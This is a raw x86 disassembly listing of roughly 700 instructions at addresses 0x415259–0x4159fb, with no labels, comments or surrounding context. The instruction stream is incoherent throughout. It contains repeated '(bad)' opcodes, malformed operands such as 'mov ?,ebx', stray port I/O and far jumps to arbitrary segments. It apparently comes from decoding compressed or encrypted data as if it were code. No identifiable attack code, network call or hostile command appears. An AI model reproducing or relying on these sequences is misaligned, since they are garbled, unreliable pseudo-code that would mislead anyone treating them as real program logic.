  415259:	jge    0x4152b7
  41525b:	shl    BYTE PTR [edx],cl
  41525d:	jno    0x41520f
  41525f:	adc    ebx,0x2a
  415262:	xlat   BYTE PTR ds:[ebx]
  415263:	jnp    0x41526e
  415265:	clc    
  415266:	mul    DWORD PTR [edx+0x52]
  415269:	dec    edi
  41526a:	xchg   esi,eax
  41526b:	mul    BYTE PTR [ecx-0x51]
  41526e:	fsubr  QWORD PTR [ebp-0x4b]
  415271:	mov    esp,DWORD PTR ds:0x47206c92
  415277:	fwait
  415278:	jbe    0x4152ab
  41527a:	mov    esi,0xe274fe0f
  41527f:	repnz sbb edx,DWORD PTR [edi]
  415282:	lods   eax,DWORD PTR ds:[esi]
  415283:	aad    0x23
  415285:	in     al,dx
  415286:	popa   
  415287:	jp     0x4152b1
  415289:	inc    edx
  41528a:	clc    
  41528b:	ja     0x4152e3
  41528d:	inc    edi
  41528e:	fsubr  DWORD PTR [ecx+0x72]
  415291:	fwait
  415292:	shl    DWORD PTR [ecx+eax*1],cl
  415295:	adc    al,0xa9
  415297:	out    0xd,al
  415299:	mov    ecx,0xa0e727cf
  41529e:	scas   eax,DWORD PTR es:[edi]
  41529f:	mov    al,0xcb
  4152a1:	adc    eax,DWORD PTR [esi+0x2d]
  4152a4:	mov    ah,0xf5
  4152a6:	lahf   
  4152a7:	rcl    DWORD PTR [ebx],0xb9
  4152aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152ab:	arpl   WORD PTR [eax+0x22],di
  4152ae:	pop    edx
  4152af:	or     al,0x18
  4152b1:	clc    
  4152b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152b3:	les    eax,FWORD PTR [edx+0x5f]
  4152b6:	popf   
  4152b7:	icebp  
  4152b8:	ror    BYTE PTR [ebp-0xe31a245],1
  4152be:	adc    ah,dh
  4152c0:	test   eax,0xf6526e91
  4152c5:	mov    ax,WORD PTR [ebx]
  4152c8:	outs   dx,BYTE PTR ds:[esi]
  4152c9:	inc    eax
  4152ca:	add    BYTE PTR [ebx-0x78bfa867],0x2e
  4152d1:	aas    
  4152d2:	ror    DWORD PTR [eax],cl
  4152d4:	es or  cl,ch
  4152d7:	add    al,0xdf
  4152d9:	sub    al,0xc7
  4152db:	stos   BYTE PTR es:[edi],al
  4152dc:	int    0xd8
  4152de:	push   ebp
  4152df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152e0:	sub    bl,BYTE PTR [ecx]
  4152e2:	mov    gs,edi
  4152e4:	js     0x415326
  4152e6:	push   ds
  4152e7:	xchg   esp,eax
  4152e8:	xor    esp,DWORD PTR [eax]
  4152ea:	dec    ebp
  4152eb:	imul   ebx,DWORD PTR [ecx-0x5ea5df00],0xffffffee
  4152f2:	mov    esp,edi
  4152f4:	dec    ebx
  4152f5:	jl     0x415345
  4152f7:	mov    BYTE PTR fs:[esi-0x4233f8bc],bl
  4152fe:	enter  0x416,0x56
  415302:	pop    ds
  415303:	aad    0x41
  415305:	imul   ebp,edx,0x247f0405
  41530b:	adc    dl,BYTE PTR [ebp-0x5b0ec9b9]
  415311:	jge    0x41533c
  415313:	shl    BYTE PTR [edx],cl
  415315:	jbe    0x4152e6
  415317:	std    
  415318:	leave  
  415319:	xlat   BYTE PTR ds:[ebx]
  41531a:	jmp    0x415353
  41531c:	adc    eax,0x98b0c37b
  415321:	fild   QWORD PTR [edi]
  415323:	push   ebx
  415324:	mov    DWORD PTR [eax-0x78bd8349],edi
  41532a:	push   ds
  41532b:	ficomp DWORD PTR [edx+0x5f]
  41532e:	dec    edi
  41532f:	mov    BYTE PTR [edx+0x67f069bb],cl
  415335:	bnd jns 0x41537f
  415338:	das    
  415339:	inc    ecx
  41533a:	inc    esi
  41533b:	mov    ch,0xc1
  41533d:	stos   BYTE PTR es:[edi],al
  41533e:	daa    
  41533f:	xor    eax,0x5f17ae48
  415344:	hlt    
  415345:	pop    ds
  415346:	sub    edx,DWORD PTR [edx-0x6a]
  415349:	xor    eax,0xdc39f0b2
  41534e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41534f:	les    esi,FWORD PTR [edi-0x71]
  415352:	repz jecxz 0x41536e
  415355:	icebp  
  415356:	(bad)  
  415357:	mov    edi,0xaf0422bd
  41535c:	add    al,0x2e
  41535e:	xchg   ebx,eax
  41535f:	bound  edi,QWORD PTR [ecx-0x54be54ee]
  415365:	in     eax,0x4b
  415367:	push   esi
  415368:	xor    eax,DWORD PTR [eax]
  41536a:	ret    
  41536b:	xor    esi,DWORD PTR [ebp-0x2b]
  41536e:	in     al,dx
  41536f:	scas   eax,DWORD PTR es:[edi]
  415370:	scas   eax,DWORD PTR es:[edi]
  415371:	push   ss
  415372:	shl    DWORD PTR fs:[esi+0x633459ce],0x57
  41537a:	jg     0x415330
  41537c:	mov    BYTE PTR [edi+0x69f7eb3c],0xf4
  415383:	ins    DWORD PTR es:[edi],dx
  415384:	into   
  415385:	inc    esi
  415386:	or     eax,0x3d5a3722
  41538b:	adc    ebp,edx
  41538d:	sub    DWORD PTR [ecx],esp
  41538f:	popf   
  415390:	or     esi,eax
  415392:	xchg   esi,eax
  415393:	loope  0x4153c7
  415395:	jp     0x4153b3
  415397:	cmp    bh,ch
  415399:	cmp    al,0x51
  41539b:	fist   DWORD PTR ds:0x70f6a2a5
  4153a1:	mov    cl,BYTE PTR [edx+eiz*8-0x6daff306]
  4153a8:	sbb    BYTE PTR [edx-0x10417f8],dh
  4153ae:	fidiv  DWORD PTR [eax]
  4153b0:	push   ebx
  4153b1:	cs sub al,0x97
  4153b4:	xlat   BYTE PTR ds:[ebx]
  4153b5:	mov    dh,0xeb
  4153b7:	jne    0x4153d6
  4153b9:	fstp   QWORD PTR [edi-0x41]
  4153bc:	pshufw mm3,QWORD PTR [ebp+0x72536cca],0x41
  4153c4:	popa   
  4153c5:	adc    ecx,0xbcc204ad
  4153cb:	ja     0x4153ac
  4153cd:	mov    esp,0xf412f70c
  4153d2:	xlat   BYTE PTR ds:[ebx]
  4153d3:	jnp    0x4153ae
  4153d5:	imul   esi,DWORD PTR [esi],0x34
  4153d8:	fucomp st(2)
  4153da:	test   al,0x70
  4153dc:	xchg   ebx,eax
  4153dd:	adc    dh,BYTE PTR [esi]
  4153df:	retf   0xe253
  4153e2:	pop    ds
  4153e3:	dec    eax
  4153e4:	add    DWORD PTR [eax-0x2a341a2f],0xfffffffd
  4153eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153ec:	dec    edi
  4153ed:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153ef:	in     eax,dx
  4153f0:	or     DWORD PTR [ebx],edx
  4153f2:	cmp    eax,0xd0aa8009
  4153f7:	mov    fs,WORD PTR [eax]
  4153f9:	div    eax
  4153fb:	out    dx,al
  4153fc:	inc    ebx
  4153fd:	ins    DWORD PTR es:[edi],dx
  4153fe:	and    esp,ebx
  415400:	fcmovbe st,st(3)
  415402:	cmp    eax,0x6083a2ec
  415407:	xchg   BYTE PTR [eax],ch
  415409:	jle    0x4153dc
  41540b:	ret    0x4d9d
  41540e:	sbb    cl,bh
  415410:	outs   dx,BYTE PTR ds:[esi]
  415411:	sbb    DWORD PTR ds:0xfe811fd1,0xffffffdd
  415418:	call   0x80f30eda
  41541d:	xchg   esp,eax
  41541e:	mov    esi,0x69e8db8
  415423:	retf   
  415424:	mov    eax,ds:0xbd1b2f74
  415429:	and    ah,dl
  41542b:	rcl    BYTE PTR [esi],0x24
  41542e:	popa   
  41542f:	cmp    eax,0x67681e4d
  415434:	sbb    esp,DWORD PTR [edi+0x2a]
  415437:	adc    ebp,DWORD PTR [ecx-0x405714b1]
  41543d:	inc    esi
  41543e:	scas   al,BYTE PTR es:[edi]
  41543f:	dec    esi
  415440:	and    esp,ebp
  415442:	push   es
  415443:	or     ch,0x60
  415446:	jo     0x4154ae
  415448:	out    dx,eax
  415449:	ss int 0x17
  41544c:	iret   
  41544d:	adc    al,0x25
  41544f:	mov    WORD PTR [edx],ss
  415451:	and    ecx,0x96a68886
  415457:	stc    
  415458:	xor    dh,BYTE PTR [ebx]
  41545a:	push   esi
  41545b:	rol    cl,1
  41545d:	stos   DWORD PTR es:[edi],eax
  41545e:	dec    ebp
  41545f:	lea    esi,[ecx+0x20]
  415462:	retf   
  415463:	retf   
  415464:	push   ecx
  415465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415466:	(bad)  
  415467:	push   ebx
  415468:	les    eax,FWORD PTR [esi-0x64]
  41546b:	adc    dl,dh
  41546d:	jmp    0xc887:0x87a944b
  415474:	das    
  415475:	jmp    0xb990325b
  41547a:	add    al,0xad
  41547c:	mov    gs,WORD PTR [edi]
  41547e:	addr16 into 
  415480:	loopne 0x415478
  415482:	cmp    DWORD PTR [ecx],eax
  415484:	cmp    ah,bh
  415486:	lahf   
  415487:	mov    ds:0xdb6353aa,al
  41548c:	outs   dx,DWORD PTR ds:[esi]
  41548d:	cmp    eax,0xb39913dc
  415492:	mov    ah,0xa7
  415494:	pop    ds
  415495:	frstor [edi+0x63716c0a]
  41549b:	mov    DWORD PTR [eax],ebx
  41549d:	(bad)
  4154a0:	je     0x41550b
  4154a2:	jnp    0x41545a
  4154a4:	jge    0x41550a
  4154a6:	daa    
  4154a7:	push   eax
  4154a8:	mov    ah,0xd4
  4154aa:	aam    0xbb
  4154ac:	dec    DWORD PTR [ebp-0x46]
  4154af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154b0:	xchg   esp,eax
  4154b1:	pop    ecx
  4154b2:	out    0x60,eax
  4154b4:	loop   0x41548c
  4154b6:	fdivr  DWORD PTR [eax]
  4154b8:	adc    dh,BYTE PTR [ecx-0x75]
  4154bb:	aam    0xbd
  4154bd:	inc    ecx
  4154be:	fcomp  QWORD PTR ds:0x3a56e304
  4154c4:	sbb    BYTE PTR [ebx+ecx*2-0x6e],0x8b
  4154c9:	jmp    0x6db7:0x446b70e9
  4154d0:	pop    edi
  4154d1:	sbb    ah,cl
  4154d3:	cmp    BYTE PTR [edi-0xb4683d9],0x72
  4154da:	loope  0x41554c
  4154dc:	adc    al,0x65
  4154de:	into   
  4154df:	sbb    bl,BYTE PTR ds:0xc3c6b3f9
  4154e5:	push   ss
  4154e6:	sub    eax,DWORD PTR ds:0x8f78fd1
  4154ec:	test   DWORD PTR [edx+0xf2d9019],esp
  4154f2:	loop   0x415571
  4154f4:	rcl    DWORD PTR [ecx],cl
  4154f6:	xchg   ecx,eax
  4154f7:	mov    al,0x2b
  4154f9:	out    0xa0,eax
  4154fb:	xchg   edx,eax
  4154fc:	ja     0x415550
  4154fe:	xlat   BYTE PTR ds:[ebx]
  4154ff:	retf   
  415500:	fstp   DWORD PTR [eax+0x5a3d3ea0]
  415506:	sub    eax,0x3dbe0781
  41550b:	jecxz  0x4154a8
  41550d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41550e:	sub    eax,0x6ee4d45c
  415513:	cmc    
  415514:	leave  
  415515:	push   ecx
  415516:	inc    ecx
  415517:	push   ebp
  415518:	mov    ah,bl
  41551a:	xor    al,0x36
  41551c:	push   ebx
  41551d:	lods   eax,DWORD PTR ds:[esi]
  41551e:	mov    cl,0x89
  415520:	xchg   ecx,eax
  415521:	fucomp st(0)
  415523:	das    
  415524:	popa   
  415525:	mov    al,BYTE PTR [ebp-0x70eba9bc]
  41552b:	out    0xdc,al
  41552d:	and    al,0x56
  41552f:	inc    ebx
  415530:	push   ebp
  415531:	dec    ebx
  415532:	xor    esi,DWORD PTR [edi-0x53]
  415535:	and    BYTE PTR [ecx],bh
  415537:	or     al,0x34
  415539:	xor    al,0x2c
  41553b:	sar    bh,cl
  41553d:	pop    ss
  41553e:	lds    ebx,FWORD PTR [esi+eiz*1+0x7fa55752]
  415545:	cli    
  415546:	mov    ebx,0xf5fc1623
  41554b:	mov    esp,0x27929aaa
  415550:	xchg   esp,eax
  415551:	jg     0x4155bf
  415553:	xchg   DWORD PTR [ebx-0x50],edx
  415556:	jb     0x415559
  415558:	jae    0x415556
  41555a:	test   al,0x6b
  41555c:	sbb    DWORD PTR [ebp-0x57bbe487],ebp
  415562:	push   ds
  415563:	mov    ?,ebx
  415565:	dec    ecx
  415566:	cmp    dl,BYTE PTR [ecx-0xf]
  415569:	shl    BYTE PTR [ebx+0x65dc37a9],1
  41556f:	and    bh,dh
  415571:	pop    esi
  415572:	fxch   st(4)
  415574:	out    dx,eax
  415575:	or     bh,BYTE PTR [ebx+eax*8-0x8b36304]
  41557c:	pop    ds
  41557d:	xlat   BYTE PTR ds:[ebx]
  41557e:	xor    al,0x16
  415580:	mov    al,0xc2
  415582:	mov    esi,0x23ef758d
  415587:	psubq  mm4,QWORD PTR [eax-0x5383646]
  41558e:	push   ebx
  41558f:	sub    bl,BYTE PTR [ebx]
  415591:	dec    ecx
  415592:	loope  0x41556f
  415594:	xchg   edx,eax
  415595:	fstp   TBYTE PTR [ecx+0x1479cbc5]
  41559b:	int3   
  41559c:	aaa    
  41559d:	loop   0x415545
  41559f:	adc    al,0xac
  4155a1:	imul   esi,ecx,0x23
  4155a4:	pop    eax
  4155a5:	imul   di,dx,0x7b
  4155a9:	or     DWORD PTR [edx-0x1450c9bd],ecx
  4155af:	std    
  4155b0:	sub    al,0x33
  4155b2:	dec    edx
  4155b3:	mov    ds:0x969ddc3f,al
  4155b8:	push   ss
  4155b9:	cmp    al,BYTE PTR [edx-0x3cd69c17]
  4155bf:	rol    BYTE PTR [edx-0x7d],1
  4155c2:	and    bl,BYTE PTR [edx-0x2a]
  4155c5:	popa   
  4155c6:	pop    edx
  4155c7:	pop    ecx
  4155c8:	mov    esi,0x4ce2dd74
  4155cd:	mov    ecx,DWORD PTR [ebp+0x3a]
  4155d0:	les    edi,FWORD PTR [ecx-0x7]
  4155d3:	xchg   BYTE PTR [esi],bl
  4155d5:	loope  0x41563a
  4155d7:	ja     0x415561
  4155d9:	mov    BYTE PTR es:[esi-0x23],ah
  4155dd:	pop    ebx
  4155de:	push   eax
  4155df:	aam    0x87
  4155e1:	adc    dl,BYTE PTR [ebx]
  4155e3:	sahf   
  4155e4:	xchg   ebp,eax
  4155e5:	and    al,BYTE PTR [esi]
  4155e7:	sub    DWORD PTR ds:0x3a5b7e4a,ebp
  4155ed:	inc    esp
  4155ee:	cmp    al,0x4d
  4155f0:	cdq    
  4155f1:	pop    edi
  4155f2:	inc    ecx
  4155f3:	xchg   esp,eax
  4155f4:	inc    ebx
  4155f6:	jnp    0x4155e3
  4155f8:	push   0xe37692a4
  4155fd:	jns    0x415581
  4155ff:	mov    WORD PTR ds:0xf2e4fccb,cs
  415605:	jecxz  0x4155ac
  415607:	xchg   edx,eax
  415608:	pop    es
  415609:	or     edi,0x103f67f5
  41560f:	jb     0x41568b
  415611:	jo     0x4155f4
  415613:	push   edx
  415614:	in     al,0xae
  415616:	mov    ah,0xb5
  415618:	test   al,0x4
  41561a:	es out dx,al
  41561c:	mov    WORD PTR [edi+eiz*4],gs
  41561f:	jecxz  0x4155d6
  415621:	cld    
  415622:	or     BYTE PTR [ebp-0x41a19cc9],bl
  415628:	es in  eax,dx
  41562a:	xlat   BYTE PTR ds:[ebx]
  41562b:	push   0x34
  41562d:	xchg   BYTE PTR [edi],cl
  41562f:	test   eax,0x565d7046
  415634:	push   cs
  415635:	int    0x16
  415637:	pop    edi
  415638:	fcom   QWORD PTR [ebx-0x72f518e5]
  41563e:	fdiv   QWORD PTR [esi-0x61]
  415641:	xchg   BYTE PTR [edx+0x27],dh
  415644:	sbb    bh,dh
  415646:	lahf   
  415647:	jl     0x4156ac
  415649:	in     al,dx
  41564a:	stc    
  41564b:	mov    eax,0xbc541699
  415650:	jmp    0xed5a:0x8c7b5edf
  415657:	idiv   DWORD PTR [ebx+edx*2]
  41565a:	adc    al,0xbd
  41565c:	mov    ebx,cs
  41565e:	les    edx,FWORD PTR [eax]
  415660:	popf   
  415661:	and    ebx,DWORD PTR ds:0x7b2c38a7
  415667:	call   0xf611:0xf4b698fa
  41566e:	js     0x415687
  415670:	inc    eax
  415671:	xchg   ecx,eax
  415672:	adc    eax,0xe5c9fe81
  415677:	mov    ah,0xf1
  415679:	mov    ebx,0xba0f7578
  41567e:	in     eax,dx
  41567f:	sub    eax,0xf6334e2c
  415684:	and    BYTE PTR [esp+edi*4],cl
  415687:	fild   QWORD PTR [ecx-0x24e564e]
  41568d:	fst    st(2)
  41568f:	in     eax,0x46
  415691:	inc    edx
  415692:	dec    eax
  415693:	and    al,0x27
  415695:	jns    0x415658
  415697:	in     al,dx
  415698:	inc    edi
  415699:	and    dl,BYTE PTR cs:[eax+0x1577f5b1]
  4156a0:	or     eax,0x607b44e2
  4156a5:	mov    al,0x48
  4156a7:	sahf   
  4156a8:	sub    al,0x19
  4156aa:	mov    bh,0xce
  4156ac:	out    dx,eax
  4156ad:	lahf   
  4156ae:	xchg   ebp,eax
  4156af:	add    bl,0x58
  4156b2:	jbe    0x4156ff
  4156b4:	in     al,0x22
  4156b6:	into   
  4156b7:	mov    gs,ebx
  4156b9:	popa   
  4156ba:	shl    cl,cl
  4156bc:	sbb    cl,BYTE PTR [eax]
  4156be:	adc    ah,dl
  4156c0:	jns    0x415702
  4156c2:	repnz mov ds:0x6ce4eda9,al
  4156c8:	imul   edx,DWORD PTR [ebp-0x2a],0xffffff84
  4156cc:	mov    al,0x49
  4156ce:	sahf   
  4156cf:	daa    
  4156d0:	or     eax,DWORD PTR [edx+esi*8+0x25]
  4156d4:	mov    ds:0xd27bf4b6,al
  4156d9:	out    dx,eax
  4156da:	imul   edx,ebp,0x7261c62e
  4156e0:	(bad)  
  4156e1:	dec    esi
  4156e2:	call   0x3154:0x8504449b
  4156e9:	lock fwait
  4156eb:	dec    edx
  4156ec:	and    BYTE PTR [ebp+0x1b7b33b1],0x8d
  4156f3:	jne    0x4156d8
  4156f5:	popa   
  4156f6:	or     DWORD PTR [ebx-0x616caad7],edi
  4156fc:	mov    eax,0x8f186fb
  415701:	cmp    DWORD PTR [eax-0x32],ebp
  415704:	mov    ebx,0x571ef424
  415709:	aaa    
  41570a:	adc    ebx,DWORD PTR [esi+0x390682c8]
  415710:	jo     0x41569d
  415712:	pop    ss
  415713:	(bad)  
  415714:	jb     0x415774
  415716:	cmp    DWORD PTR [ecx+edi*2],ecx
  415719:	in     al,dx
  41571a:	push   cs
  41571b:	jno    0x415776
  41571d:	cs and al,0x78
  415720:	icebp  
  415721:	je     0x4156fd
  415723:	out    dx,al
  415724:	pop    esp
  415725:	cmp    ah,BYTE PTR ss:[eax+0x73ebee83]
  41572c:	inc    edx
  41572d:	pop    ebx
  41572e:	rcr    bh,0xf2
  415731:	(bad)  
  415732:	mov    ds:0x2f2e07cf,eax
  415737:	lea    edx,[ecx+ebp*4]
  41573a:	shl    BYTE PTR ds:0xe37a3691,0xdf
  415741:	rol    BYTE PTR [esi+0x23],1
  415744:	and    DWORD PTR [ebp-0x182705ad],ecx
  41574a:	inc    edi
  41574b:	xor    ebx,DWORD PTR [edi-0x23]
  41574e:	mov    al,ds:0xfcc2c69b
  415753:	ja     0x415750
  415755:	ins    DWORD PTR es:[edi],dx
  415756:	shl    BYTE PTR [ebx+0x3dab3193],cl
  41575c:	dec    esi
  41575d:	shr    DWORD PTR [edx-0x1b],cl
  415760:	data16 fadd QWORD PTR [esi-0x5838fc6b]
  415767:	jmp    0x4157b0
  415769:	je     0x4157c0
  41576b:	fcomp  st(4)
  41576d:	sti    
  41576e:	fs aaa 
  415770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415771:	sub    ah,0x69
  415774:	jge    0x415732
  415776:	out    0x59,eax
  415778:	cli    
  415779:	inc    ecx
  41577a:	pop    ds
  41577b:	shr    BYTE PTR [ebx-0x183a9dc4],cl
  415781:	fld    QWORD PTR [ebp-0x33]
  415784:	cmp    edi,edi
  415786:	add    edx,DWORD PTR [edx+0x49]
  415789:	out    dx,al
  41578a:	xchg   edx,eax
  41578b:	lods   eax,DWORD PTR ds:[esi]
  41578c:	xchg   DWORD PTR [eax],ebp
  41578e:	or     esp,DWORD PTR cs:[esp+ebx*8-0x32c30b4]
  415796:	jp     0x4157d4
  415798:	bound  edx,QWORD PTR [ecx+ebx*4+0x2e]
  41579c:	sti    
  41579d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41579e:	fadd   DWORD PTR [edx]
  4157a0:	inc    esi
  4157a1:	jne    0x4157e6
  4157a3:	xor    BYTE PTR [esi+0x7a8c2a29],bl
  4157a9:	jmp    0x4157a5
  4157ab:	add    eax,0xb07b6651
  4157b0:	add    BYTE PTR [esi],0xb2
  4157b3:	xor    edx,DWORD PTR [eax]
  4157b5:	mov    al,ds:0xdb70af10
  4157ba:	add    DWORD PTR ds:0x2a55285a,eax
  4157c0:	sbb    ebp,0xf5fefa3d
  4157c6:	xlat   BYTE PTR ds:[ebx]
  4157c7:	cld    
  4157c8:	jne    0x4157fa
  4157ca:	(bad)  
  4157cb:	icebp  
  4157cc:	pop    edi
  4157cd:	cmp    al,0xbe
  4157cf:	push   ebp
  4157d0:	pusha  
  4157d1:	jp     0x415773
  4157d3:	xchg   ebp,eax
  4157d4:	call   0x76da:0xcdc70d08
  4157db:	cmc    
  4157dc:	sar    DWORD PTR [esi],cl
  4157de:	sub    al,BYTE PTR [ecx+0xe6820d5]
  4157e4:	addr16 data16 fwait
  4157e7:	rol    BYTE PTR [esi],0x24
  4157ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157eb:	addr16 int 0xab
  4157ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157ef:	in     al,dx
  4157f0:	mov    ecx,0xea4db7ff
  4157f5:	push   esi
  4157f6:	sbb    cl,al
  4157f8:	xor    DWORD PTR [edx-0x1e4e259c],eax
  4157fe:	xor    al,BYTE PTR [eax]
  415800:	push   esi
  415801:	pop    esi
  415802:	xchg   esi,eax
  415803:	icebp  
  415804:	rol    DWORD PTR [esi],0x86
  415807:	and    edx,ecx
  415809:	push   es
  41580a:	or     al,0xf
  41580c:	inc    edx
  41580d:	or     BYTE PTR [ebx],0xb8
  415810:	adc    BYTE PTR [edi],dh
  415812:	mov    ds:0xbd326e33,eax
  415817:	ret    
  415818:	inc    edi
  415819:	popf   
  41581a:	test   al,0xdc
  41581c:	cmp    DWORD PTR [ebx],edx
  41581e:	rcl    DWORD PTR [edx],cl
  415820:	mov    ah,0x72
  415822:	ja     0x4157f3
  415824:	int3   
  415825:	test   BYTE PTR [esi],0x8b
  415828:	xchg   ebp,eax
  415829:	fdiv   DWORD PTR [edi+0x26]
  41582c:	cmc    
  41582d:	loop   0x415802
  41582f:	push   esi
  415830:	loope  0x415838
  415832:	and    DWORD PTR [ecx+esi*4-0x35],0xd123da64
  41583a:	iret   
  41583b:	cmc    
  41583c:	xchg   edx,eax
  41583d:	and    al,0x5b
  41583f:	ja     0x4158a4
  415841:	adc    cl,BYTE PTR [edi]
  415843:	dec    ecx
  415844:	xor    al,0xd1
  415846:	push   edx
  415847:	mov    al,ds:0x8f8830b0
  41584c:	mov    WORD PTR [ebp+0x27],cs
  41584f:	fnsave [edx+eiz*2]
  415852:	aas    
  415853:	les    edi,FWORD PTR [edx]
  415855:	mov    eax,ds:0xad64d1c
  41585a:	idiv   DWORD PTR [ecx+0x1c027b38]
  415860:	shl    ecx,cl
  415862:	icebp  
  415863:	push   esi
  415864:	sbb    BYTE PTR [esi+ecx*1],cl
  415867:	and    ch,BYTE PTR [ebx-0xe0846f2]
  41586d:	in     eax,dx
  41586e:	fdivr  DWORD PTR [eax]
  415870:	je     0x41582e
  415872:	adc    al,0x51
  415874:	(bad)  
  415875:	loopne 0x415829
  415877:	pop    ds
  415878:	rcl    dl,cl
  41587a:	xchg   esi,eax
  41587b:	fcom   st(6)
  41587d:	or     eax,0xa791978c
  415882:	or     al,0x3
  415884:	mov    esp,0xf8170619
  415889:	retf   
  41588a:	icebp  
  41588b:	mov    ?,WORD PTR [eax-0x4c]
  41588e:	jl     0x4158d8
  415890:	out    dx,eax
  415891:	(bad)  [eax-0x2af33373]
  415897:	push   edx
  415898:	in     al,0x3b
  41589a:	nop
  41589b:	mov    cl,dl
  41589d:	xor    edx,DWORD PTR [esi-0x2f]
  4158a0:	test   ecx,esi
  4158a2:	cmp    DWORD PTR [ebx+0x66],edx
  4158a5:	sti    
  4158a6:	jg     0x41588a
  4158a8:	in     al,0x19
  4158aa:	hlt    
  4158ab:	jmp    0x8280:0x5bf75321
  4158b2:	pop    edx
  4158b3:	int3   
  4158b4:	mov    edx,0x5036c40b
  4158b9:	in     al,dx
  4158ba:	mov    cl,0xf2
  4158bc:	push   0x5505c898
  4158c1:	sar    BYTE PTR [ebp+0x7d],0x88
  4158c5:	fs sub ecx,DWORD PTR ds:[ebp+0x767d778d]
  4158cd:	cmp    al,BYTE PTR [eax+0x7d]
  4158d0:	push   ebx
  4158d1:	aad    0xc1
  4158d3:	mov    ds:0xf4c9e560,eax
  4158d8:	rep outs dx,DWORD PTR ds:[esi]
  4158da:	sub    BYTE PTR [edx+edi*8-0x31],bh
  4158de:	fcom   st(2)
  4158e0:	jb     0x4158f7
  4158e2:	and    eax,0xab46b5b1
  4158e7:	in     eax,0x3f
  4158e9:	mov    ss,WORD PTR [eax+0x321ba57d]
  4158ef:	mov    cs,WORD PTR [ebx-0x4ebb32a0]
  4158f5:	inc    esp
  4158f6:	sbb    al,0xc9
  4158f8:	or     BYTE PTR [ebx],ch
  4158fa:	in     al,0xe7
  4158fc:	(bad)  
  4158fd:	mov    ds:0x9f4af492,eax
  415902:	jnp    0x415900
  415904:	inc    edx
  415905:	out    0x0,al
  415907:	ja     0x415946
  415909:	imul   edx,edi,0x77
  41590c:	xchg   edi,eax
  41590d:	das    
  41590e:	push   cs
  41590f:	jg     0x4158bc
  415911:	es mov eax,0xa30fcb99
  415917:	out    0xed,eax
  415919:	leave  
  41591a:	dec    edi
  41591b:	mov    eax,0xc4cef027
  415920:	xor    DWORD PTR [esi+ecx*1+0x3c],0xffffff96
  415925:	rol    dh,cl
  415927:	mov    ch,0x14
  415929:	mov    cl,cl
  41592b:	in     eax,dx
  41592c:	pushf  
  41592d:	mov    BYTE PTR [ebp+0x3d],ah
  415930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415931:	stos   DWORD PTR es:[edi],eax
  415932:	test   al,0xa4
  415934:	call   0x1573e8d1
  415939:	xchg   esi,eax
  41593a:	adc    eax,0xae931ee3
  41593f:	and    al,0x63
  415941:	das    
  415942:	mov    ebx,0x53b1844c
  415947:	(bad)  
  415948:	jmp    0x83cdfdff
  41594d:	add    al,0xc5
  41594f:	xchg   esp,eax
  415950:	mov    esi,0x93170d30
  415955:	and    eax,eax
  415957:	add    al,0xca
  415959:	pop    ds
  41595a:	jo     0x41598c
  41595c:	loop   0x4159cd
  41595e:	outs   dx,BYTE PTR gs:[esi]
  415960:	inc    esp
  415961:	push   eax
  415962:	into   
  415963:	ins    DWORD PTR es:[edi],dx
  415964:	fnstenv [ecx-0x1c]
  415967:	stc    
  415968:	arpl   WORD PTR [edi],sp
  41596a:	sub    al,0xcd
  41596c:	xchg   edi,eax
  41596d:	leave  
  41596e:	xchg   DWORD PTR [ecx+0x3fe3c112],eax
  415974:	sub    BYTE PTR [eax],0x25
  415977:	arpl   WORD PTR [ebx],bp
  415979:	(bad)  
  41597b:	mov    ah,0x70
  41597d:	enter  0xe68a,0xd5
  415981:	aam    0xb0
  415983:	or     BYTE PTR [edi+0x26f8626e],dh
  415989:	dec    esp
  41598a:	sub    al,0x16
  41598c:	adc    BYTE PTR [edi+0x23],bh
  41598f:	test   al,ah
  415991:	adc    esp,ecx
  415993:	fcmovbe st,st(1)
  415995:	into   
  415996:	(bad)  
  415997:	in     eax,0x5a
  415999:	or     DWORD PTR [edi+ebp*1+0x5a5cf39f],edi
  4159a0:	test   al,0x2
  4159a2:	push   ds
  4159a3:	push   0xc7dedb7a
  4159a8:	dec    eax
  4159a9:	sbb    bl,ch
  4159ab:	pop    ebp
  4159ac:	push   cs
  4159ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159ae:	bound  ebx,QWORD PTR [edi+0x4d]
  4159b1:	imul   DWORD PTR [edx+0x26]
  4159b4:	fdiv   st,st(0)
  4159b6:	outs   dx,DWORD PTR ds:[esi]
  4159b7:	xor    al,0xf9
  4159b9:	outs   dx,DWORD PTR ds:[esi]
  4159ba:	fld    DWORD PTR [edi+0x4c]
  4159bd:	in     eax,0xc7
  4159bf:	mov    eax,0x2b20acfe
  4159c4:	cmc    
  4159c5:	inc    esi
  4159c6:	xor    DWORD PTR fs:[esp+esi*1+0x73],ebx
  4159cb:	push   edi
  4159cc:	rcl    BYTE PTR [ecx-0x139e6bb4],0xb5
  4159d3:	int    0x6
  4159d5:	push   cx
  4159d7:	xor    edi,ecx
  4159d9:	push   cs
  4159da:	xor    al,0x2
  4159dc:	or     BYTE PTR [edx],cl
  4159de:	adc    DWORD PTR [edi],edi
  4159e0:	(bad)  
  4159e1:	dec    edx
  4159e2:	test   DWORD PTR [ebx],esi
  4159e4:	and    esp,ebp
  4159e6:	jp     0x415999
  4159e8:	or     esp,DWORD PTR [esi+ebp*8-0x7b]
  4159ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159ed:	les    eax,FWORD PTR [edx-0x34]
  4159f0:	jne    0x4159e6
  4159f2:	push   esp
  4159f3:	dec    ebp
  4159f4:	inc    eax
  4159f5:	add    ebx,esi
  4159f7:	mov    WORD PTR [eax+esi*4-0x2f],es
  4159fb:	out    dx,al
